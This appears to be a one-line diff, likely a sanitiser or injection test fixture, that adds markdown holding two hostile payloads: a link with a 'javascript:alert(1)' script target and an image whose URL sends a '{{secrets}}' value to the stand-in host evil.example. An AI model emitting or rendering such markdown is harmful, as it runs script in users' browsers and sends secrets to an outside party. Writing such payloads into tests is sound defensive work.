@@ -1,0 +1,1 @@
+[click here](javascript:alert(1)) ![x](https://evil.example/track.png?leak={{secrets}})
